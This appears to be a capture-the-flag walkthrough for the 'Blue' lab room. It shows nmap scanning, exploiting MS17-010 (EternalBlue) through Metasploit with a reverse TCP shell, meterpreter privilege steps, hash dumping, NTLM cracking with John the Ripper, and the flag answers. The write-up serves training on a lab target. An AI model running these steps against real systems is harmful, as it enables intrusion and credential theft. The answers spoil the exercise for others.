# Blue

> Evan Diamantidis | May 30th, 2022

--------------------------

<br />

# 1. Recon

1.1: Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)

Nmap will help us gather some information about our target. For the purposes of this box, since task 1.3 is asking *what this machine is vulnerable to*, we will be adding the "-sS --script=vuln" argument to our nmap scan. The "initial" output file under the "nmap" folder shows the following:
```
# Nmap 7.92 scan initiated Mon May 30 07:24:31 2022 as: nmap -sC -sV -sS --script=vuln -oN nmap/initial 10.10.239.152
Nmap scan report for 10.10.239.152
Host is up (0.015s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-ccs-injection: No reply from server (TIMEOUT)
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 30 07:26:11 2022 -- 1 IP address (1 host up) scanned in 100.47 seconds
```

```
No answer needed
```

1.2: How many ports are open with a port number under 1000?
```
3
```

1.3: What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
```
MS17-010
```

<br />
<br />

# 2. Gain Access
	
2.1: Start Metasploit
```
No answer needed
```

2.2: Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

Searching Metasploit for "MS17-010" will show the relevant modules we could use to attack the machine.
```
search MS17-010
```
![image](https://user-images.githubusercontent.com/14150485/170931184-aeec3b61-685c-4c8c-b059-6000b0ffc6a5.png)

EternalBlue is a well-known SMB exploit which we have also used in other rooms:
```
use 0
```
Altenatively:
```
use exploit/windows/smb/ms17_010_eternalblue
```
The answer is therefore:
```
exploit/windows/smb/ms17_010_eternalblue
```

2.3: Show options and set the one required value. What is the name of this value? (All caps for submission)

Running the "show options" command shows us which values we need to set before we can successfully execute the exploit:
```
show options
```

![image](https://user-images.githubusercontent.com/14150485/170932504-69f81f87-cb75-4051-9815-ed120e88e63d.png)

```
set RHOSTS REMOTEIP
```
The answer is:
```
RHOSTS
```

2.4: Usually it would be fine to run this exploit as is however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:

<br />

*set payload windows/x64/shell/reverse_tcp*

<br />

We are now ready to run the exploit.
```
No answer needed
```
2.5: Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target. 

And we're in!

![image](https://user-images.githubusercontent.com/14150485/170935109-606cc4c8-8f74-4c7b-b877-1af20ef8a9bf.png)

```
No answer needed
```
<br />
<br />

# 3. Escalate

3.1: If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)

We push the current shell to the background:
```
background
```

Alternatively:
```
Ctrl + Z
```

We now have to go back and search for "shell_to_meterpreter" as hinted on the question.
```
search shell_to_meterpreter
```
The only result coming up is "post/multi/manage/shell_to_meterpreter".

![image](https://user-images.githubusercontent.com/14150485/170936056-c4af50e2-a5a9-45be-a2c8-0e428a783165.png)

```
post/multi/manage/shell_to_meterpreter
```

3.2: Select this (use MODULE_PATH). Show options, what option are we required to change?

Listing the options for this module, we will be required to update the "SESSION" attribute with our active session ID.

![image](https://user-images.githubusercontent.com/14150485/170936412-866b08d9-ade7-4d1f-89d9-8f0f05aa6044.png)

The answer is:
```
SESSION
```

3.3: Set the required option, you may need to list all of the sessions to find your target here.

We can view our active session ID using the "sessions" command.
```
sessions
```
![image](https://user-images.githubusercontent.com/14150485/170936885-e6cdaba0-7814-4f9f-8031-c822284cfc1a.png)

We can now proceed to update the value:
```
set SESSION SESSIONNUMBER
```
That's it, we should now be ready to run the exploit.

```
No answer needed
```

3.4: Run! If this doesn't work, try completing the exploit from the previous task once more.

Running the exploit should inform us that the module was successfully executed.

![image](https://user-images.githubusercontent.com/14150485/170937967-4df7d691-5e88-4531-b2af-c8b784afdc25.png)

```
No answer needed
```

3.5: Once the meterpreter shell conversion completes, select that session for use.

We can switch to our active session using the following command:
```
sessions -i SESSIONNUMBER
```
![image](https://user-images.githubusercontent.com/14150485/170939666-6af9a594-23be-457a-97a0-1bf67a2ee72c.png)

```
No answer needed
```

3.6: Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.

As instructed, using the "shell" and "whoami" commands will show us the current privileges on the target system.

![image](https://user-images.githubusercontent.com/14150485/170939937-37bc0838-71ad-484d-b583-9f750bdc6b92.png)

```
No answer needed
```

3.7: List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

For this, we need to move back to the meterpreter shell using "Ctrl + Z".
```
Ctrl + Z
```
We can now run the "ps" command to list the active processes.
```
ps
```
![image](https://user-images.githubusercontent.com/14150485/170947023-3f79b27f-5e3d-484b-ac35-2682a66a6f4a.png)

```
No answer needed
```

3.8: Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.

We might need to try multiple processes for this until we can successfully migrate to one.
```
migrate PROCESSID
```
![image](https://user-images.githubusercontent.com/14150485/170947190-405b831f-0220-4ecf-baf2-097dd9c8e46a.png)

```
No answer needed
```

<br />
<br />

# 4. Cracking

4.1: Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 

This one is simple, we just need to run the "hashdump" commmand to get the hashes.
```
hashdump
```

![image](https://user-images.githubusercontent.com/14150485/170947857-bd9ec4e3-2084-41b0-9a9f-90541bb5d870.png)

There are 3 users, 1 of which appears to be non-default.
```
Jon
```

4.2: Copy this password hash to a file and research how to crack it. What is the cracked password?

Since this is a Windows machine, we can expect to see NT hashes (also known as NTLM). We can confirm this by checking the hash against a hash identifier at https://hashes.com/en/tools/hash_identifier.

![image](https://user-images.githubusercontent.com/14150485/170950699-7aedfbef-129d-4232-8ff4-a6f5ae7fd715.png)

Now that we have confirmed this to be an NTLM hash we can easily proceed to crack it using John The Ripper. To do so, create a file at a location of your choice and paste the hash into it. Then let John do what he does best!
```
john --format=NT --wordlist=ROCKYOUFOLDERHERE/rockyou.txt FILENAMEHERE
```

![image](https://user-images.githubusercontent.com/14150485/170951262-ecea0adc-561b-46e9-a305-aa518cb7361d.png)

```
alqfna22
```

<br />
<br />

# 5. Find flags!

5.1: Flag1? This flag can be found at the system root.

Easy one - The top folder on Windows systems is "C:\\", as also subtly hinted on the question.

![image](https://user-images.githubusercontent.com/14150485/170952503-4048ea2c-61b8-4da7-b13b-ce77f8a05085.png)

Here it is - "flag1.txt" is indeed located in this folder. Now for the file contents.
```
cat flag1.txt
```

![image](https://user-images.githubusercontent.com/14150485/170952910-3375a111-c33b-4178-8981-47f78e8fab64.png)

The flag is:
```
flag{access_the_machine}
```

5.2: Flag2? This flag can be found at the location where passwords are stored within Windows.

*Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen. 

On Windows systems, local user account details are stored in "C:\Windows\system32\config\\". Navigating to this folder and listing its contents confirms the existence of the "flag2.txt" file.
```
cd Windows\\System32\\config\\
ls
```

![image](https://user-images.githubusercontent.com/14150485/170956190-4010902b-c47d-4c1d-97de-4e03b8b906ba.png)

Viewing the contents of the file reveals the flag string we are looking for.
```
cat flag2.txt
```

![image](https://user-images.githubusercontent.com/14150485/170956292-c159026f-22e7-4157-a6bd-247b81dff24d.png)

```
flag{sam_database_elevated_access}
```

5.3: Flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 

There are multiple ways of varying complexity that we can employ to approach this task, however our most powerful and useful weapons are knowledge, logic and, of course, our curiosity!
<br />
<br />
The question is hinting us at "Administrators" and *things* they save. As we saw in task 4.2, there are 3 accounts on this machine - Administrator, Guest and Jon. Navigating to the "C:\Users\\" folder, however, we only see a "Jon" folder along with the default ones, such as "All Users", "Default", "Public", etc.

![image](https://user-images.githubusercontent.com/14150485/170963756-4b26ea7f-8b4f-489f-9614-838230530b07.png)

Interesting, as this means we are most likely to find something in there! 
<br />
*Administrators usually have pretty interesting things saved*, and it just so happens that we are looking for a flag which, more often than not, is a string saved in a document file. This should prompt us to have a look under the "Documents" folder and see if we can find anything useful.

![image](https://user-images.githubusercontent.com/14150485/170968141-00d71b0d-707f-43cc-9083-e90075c4dc56.png)

The "flag3.txt" file is in here!

```
flag{admin_documents_can_be_valuable}
```

Congrats, you pwned Blue!

<br />
<br />

# *** SPOILER ***

There is a way we can actually find all flags with the use of a simple command, and that would simply be searching the machine for any files including the word "flag" in their name.

```
search -f *flag*.txt
```

![image](https://user-images.githubusercontent.com/14150485/170983401-d5d4f3a9-9516-4401-b5d2-9b4c063077bc.png)

Although it is the most efficient solution to this challenge, it can be counter-productive to the process since our aim is to learn as much as we can about the use of Meterpreter, shell and session switching, as well as Windows filesystems. That said, knowing how and when to take advantage of Meterpreter commands is good knowledge in itself.

